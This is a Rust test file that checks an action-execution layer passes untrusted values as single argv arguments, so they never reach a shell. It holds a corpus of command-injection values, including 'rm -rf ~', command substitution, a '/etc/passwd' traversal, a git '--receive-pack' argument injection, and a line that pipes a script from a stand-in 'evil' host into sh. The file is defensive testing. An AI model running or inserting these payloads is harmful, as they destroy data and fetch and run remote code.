//! The boundary this arc installed: **no value an action carries reaches
//! a shell**, and the one string that still does is a manifest's own
//! command.
//!
//! Spec:
//! `docs/design/specs/parallax/2026-08-21-what-an-action-may-name-design.md`.
//! Plan: Arc 1, Slice 1.3 — the property, and the reproduction.
//!
//! Both tiers are asserted in one file on purpose. The exemption for a
//! manifest command is the part of this design most likely to read as an
//! inconsistency later, and it is easiest to believe when it sits beside
//! the rule it is an exception to.

use parallax_baseline::actions::{
    authorize, Action, ActionExecutor, Confirmation, GithubWorkControl, LocalExecutor,
    LocalProcessControl, Ruling,
};
use parallax_baseline::adapters::http::FixtureTransport;
use parallax_baseline::adapters::verification::{
    CommandVerificationAdapter, Invocation, ScriptedProgramRunner, ScriptedShellRunner,
    VerificationAdapter,
};
use parallax_baseline::adapters::ProjectContext;
use std::collections::BTreeSet;
use std::time::SystemTime;

/// Values that would have been a second command inside a shell string.
///
/// The last entry is benign and is the control: a corpus in which
/// everything is hostile cannot tell "the payload was contained" from
/// "nothing ran at all".
const CORPUS: &[&str] = &[
    "x; rm -rf ~",
    "x$(id)",
    "x`id`",
    "x | sh",
    "x && curl -s http://evil/x.sh | sh",
    "x\nrm -rf ~",
    "x\0y",
    "--receive-pack=/tmp/evil",
    "../../etc/passwd",
    "x'\"$(){}[]<>*?&;|",
    "ordinary-value",
];

/// The benign value each hostile one is compared against. Chosen to
/// contain no character the corpus uses, so the substitution in
/// [`same_shape`] cannot collide with the surrounding argument.
const BENIGN: &str = "ordinary-value";

// ---------------------------------------------------------------------
// The reproduction, and its sibling
// ---------------------------------------------------------------------

/// The finding this arc was written for, kept verbatim so it stays
/// findable by the payload rather than only by the file name.
///
/// Before Arc 1 this produced the shell string
/// `plumb capture --scenario cockpit-work; curl -s http://evil/x.sh | sh`
/// and `sh -c` ran both halves of it. The whole payload is now one
/// argument, which is the entire difference.
#[test]
fn a_hostile_scenario_lands_in_exactly_one_argument() {
    let payload = "cockpit-work; curl -s http://evil/x.sh | sh";
    let mut control = LocalProcessControl::new(ScriptedProgramRunner::new(), "/projects/ttui");
    parallax_baseline::actions::ProcessControl::capture(&mut control, "ttui", Some(payload))
        .unwrap();

    assert_eq!(
        control.runner().calls(),
        [Invocation::new("plumb", ["capture", "--scenario", payload])],
        "the payload must occupy one argument and add none"
    );
}

/// The same claim for the other action that reaches a process.
///
/// Note what this does **not** assert: that a branch beginning with `-`
/// is rejected. It is not, yet — argument injection survives argv, and
/// closing it is `BranchName`'s job in Arc 2. The corpus carries
/// `--receive-pack=/tmp/evil` today only to prove it stays *one*
/// argument; Arc 2 makes it refused, and this comment is the marker for
/// whoever tightens it.
#[test]
fn a_hostile_branch_lands_in_exactly_one_refspec() {
    let payload = "main; rm -rf ~";
    let mut control = LocalProcessControl::new(ScriptedProgramRunner::new(), "/projects/ttui");
    parallax_baseline::actions::ProcessControl::push(&mut control, "ttui", payload).unwrap();

    assert_eq!(
        control.runner().calls(),
        [Invocation::new(
            "git",
            ["push", "origin", &format!("{payload}:{payload}")]
        )],
        "the refspec is one argument, however many words the branch has"
    );
}

// ---------------------------------------------------------------------
// The property
// ---------------------------------------------------------------------

/// Whether two invocations differ **only** where the payload was
/// substituted for the benign value.
///
/// This is the property argv buys and a shell string cannot offer: the
/// *shape* of an invocation — its program, and how many arguments it
/// has — does not depend on what a value contains. A shell string has to
/// be parsed to learn how many commands are in it, so a value can add
/// some; an argument list has the count fixed before the process starts.
fn same_shape(benign: &Invocation, hostile: &Invocation, payload: &str) -> bool {
    benign.program == hostile.program
        && benign.args.len() == hostile.args.len()
        && benign
            .args
            .iter()
            .zip(&hostile.args)
            .all(|(b, h)| h == b || *h == b.replace(BENIGN, payload))
}

/// Whether an argument carrying `payload` is built from **the payload
/// and nothing else**.
///
/// Shape invariance alone is not enough, and finding that out cost a
/// deliberate experiment rather than a guess: re-joining the arguments
/// into the single string `capture --scenario {s}` keeps the program and
/// the argument count identical for every payload, so [`same_shape`]
/// accepts it — while `sh -c` would have run both halves again. What
/// distinguishes the two is whether the platform's own words ended up
/// *inside* the argument holding the value.
///
/// The refspec is the one composition the platform performs, and it is
/// named here rather than pattern-matched. **A second composition must
/// be added to this list deliberately**, which is the point: a new way
/// to build an argument around an untrusted value should require someone
/// to say so here.
fn built_only_from_payload(arg: &str, payload: &str) -> bool {
    arg == payload || arg == format!("{payload}:{payload}")
}

#[test]
fn no_payload_changes_the_shape_of_an_invocation() {
    for payload in CORPUS {
        for (label, run) in process_reaching_actions() {
            let benign = run(BENIGN);
            let hostile = run(payload);

            assert_eq!(
                benign.len(),
                hostile.len(),
                "{label}: {payload:?} changed how many invocations happened"
            );
            for (b, h) in benign.iter().zip(&hostile) {
                assert!(
                    same_shape(b, h, payload),
                    "{label}: {payload:?} changed the shape of an invocation\n\
                     benign:  {b:?}\n\
                     hostile: {h:?}"
                );
            }
        }
    }
}

/// The half [`same_shape`] cannot see: the platform's words never share
/// an argument with an untrusted value.
#[test]
fn no_argument_mixes_a_payload_with_the_platform_s_own_words() {
    for payload in CORPUS {
        for (label, run) in process_reaching_actions() {
            for invocation in run(payload) {
                for arg in invocation.args.iter().filter(|a| a.contains(*payload)) {
                    assert!(
                        built_only_from_payload(arg, payload),
                        "{label}: {payload:?} was concatenated with something else \
                         into a single argument {arg:?} — that argument is a \
                         sentence, and a sentence is what this arc removed"
                    );
                }
            }
        }
    }
}

/// The two `ProcessControl` verbs that reach a program today, each as a
/// function from a payload to the invocations it produced.
#[allow(clippy::type_complexity)]
fn process_reaching_actions() -> Vec<(&'static str, Box<dyn Fn(&str) -> Vec<Invocation>>)> {
    vec![
        (
            "capture",
            Box::new(|payload: &str| {
                let mut c =
                    LocalProcessControl::new(ScriptedProgramRunner::new(), "/projects/ttui");
                parallax_baseline::actions::ProcessControl::capture(&mut c, "ttui", Some(payload))
                    .unwrap();
                c.runner().calls().to_vec()
            }),
        ),
        (
            "push",
            Box::new(|payload: &str| {
                let mut c =
                    LocalProcessControl::new(ScriptedProgramRunner::new(), "/projects/ttui");
                parallax_baseline::actions::ProcessControl::push(&mut c, "ttui", payload).unwrap();
                c.runner().calls().to_vec()
            }),
        ),
    ]
}

// ---------------------------------------------------------------------
// Every variant, through the executor
// ---------------------------------------------------------------------

/// Every action, carrying `payload` in every string field it has.
///
/// Kept complete by [`variant_name`], whose `match` has no wildcard: a
/// ninth action does not compile until someone opens this file, and this
/// list is the next thing they read. That is the mechanism
/// `acts_on_the_selected_project` already uses in the cockpit, and it is
/// worth being honest about what it buys — it routes the author here, it
/// does not write the entry for them.
fn every_action_with(payload: &str) -> Vec<Action> {
    vec![
        Action::RuleFinding {
            project: "ttui".into(),
            fingerprint: payload.into(),
            ruling: Ruling::Upheld,
        },
        Action::SetAutonomyLabel {
            project: "ttui".into(),
            item: 1,
            label: payload.into(),
        },
        Action::RequestReReview {
            project: "ttui".into(),
            item: 1,
        },
        Action::TriggerCapture {
            project: "ttui".into(),
            scenario: Some(payload.into()),
        },
        Action::DispatchAgentRun {
            project: "ttui".into(),
            item: 1,
            prompt: payload.into(),
        },
        Action::StopAgentRun {
            project: "ttui".into(),
            session: payload.into(),
        },
        Action::MergePullRequest {
            project: "ttui".into(),
            number: 1,
        },
        Action::Push {
            project: "ttui".into(),
            branch: payload.into(),
        },
    ]
}

/// Exhaustive, no wildcard. See [`every_action_with`].
fn variant_name(action: &Action) -> &'static str {
    match action {
        Action::RuleFinding { .. } => "rule-finding",
        Action::SetAutonomyLabel { .. } => "set-autonomy-label",
        Action::RequestReReview { .. } => "request-re-review",
        Action::TriggerCapture { .. } => "trigger-capture",
        Action::DispatchAgentRun { .. } => "dispatch-agent-run",
        Action::StopAgentRun { .. } => "stop-agent-run",
        Action::MergePullRequest { .. } => "merge-pull-request",
        Action::Push { .. } => "push",
    }
}

#[test]
fn the_corpus_covers_every_action_variant() {
    let names: BTreeSet<_> = every_action_with("x").iter().map(variant_name).collect();
    assert_eq!(
        names.len(),
        8,
        "if this failed because you added an action, add it to \
         `every_action_with` as well — the match in `variant_name` sent \
         you here, and stopping at the match is how the corpus rots"
    );
}

/// The arc's claim, exercised through the executor rather than through
/// `ProcessControl` directly: whatever an action carries, the process
/// side sees arguments, never a sentence.
///
/// Actions that never reach a process are included deliberately. They
/// pass trivially today — a `u64` cannot be a command, and a label
/// reaches JSON — and including them is what makes this a statement
/// about the *action set* rather than about two of its members.
#[test]
fn executing_any_action_with_any_payload_never_reaches_a_shell() {
    for payload in CORPUS {
        for action in every_action_with(payload) {
            let name = variant_name(&action);
            let rulings = tempfile::tempdir().expect("tempdir");
            let mut executor = LocalExecutor::new(
                "tatemeyer/ttui",
                rulings.path().join("rulings.jsonl"),
                GithubWorkControl::new(FixtureTransport::new()),
                // The type is the guarantee: this executor cannot be
                // given a `ShellRunner`, so no assertion below has to
                // check that a shell was avoided.
                LocalProcessControl::new(ScriptedProgramRunner::new(), "/projects/ttui"),
            );

            let confirmation = Confirmation::of(&action);
            let authorized = authorize(&action, Some(&confirmation))
                .expect("a matching confirmation authorizes");
            // `dispatch` and `stop` report `Unsupported`, and a payload
            // in a GitHub call can fail at the fixture transport. Both
            // are refusals *before* execution, which the property allows.
            let _ = executor.execute(authorized);

            for invocation in executor.process().runner().calls() {
                // The program is always one the platform named itself.
                // Nothing an action carries may choose what runs.
                assert!(
                    matches!(invocation.program.as_str(), "plumb" | "git"),
                    "{name}: {payload:?} produced an unexpected program: {invocation:?}"
                );
                for arg in invocation.args.iter().filter(|a| a.contains(*payload)) {
                    assert!(
                        built_only_from_payload(arg, payload),
                        "{name}: {payload:?} shares argument {arg:?} with the \
                         platform's own words: {invocation:?}"
                    );
                }
            }
        }
    }
}

// ---------------------------------------------------------------------
// The other tier
// ---------------------------------------------------------------------

/// Tier 2 keeps its shell, and this is the case that proves it is not an
/// oversight: SESH's real `surfaces` check.
///
/// `cd surfaces && npm test && npm run build` is two commands and a
/// directory change. It is a shell script, it lives in the repository it
/// describes, and it is trusted as code because it *is* code. Rewriting
/// it as an argv is not possible without a producer hand-rolling
/// `sh -c` — the same capability with fewer people looking at it. See
/// the spec's question 4, answered so this is not re-litigated.
#[test]
fn a_manifest_command_still_reaches_the_shell_intact() {
    const SESH_SURFACES: &str = "cd surfaces && npm test && npm run build";

    let mut adapter =
        CommandVerificationAdapter::new("surfaces", SESH_SURFACES, ScriptedShellRunner::new());
    let ctx = ProjectContext::new("sesh", "/projects/sesh");
    adapter.check(&ctx, SystemTime::UNIX_EPOCH).unwrap();

    assert_eq!(
        adapter.runner().calls(),
        [SESH_SURFACES],
        "a manifest command must arrive as one string, unsplit and unquoted"
    );
}
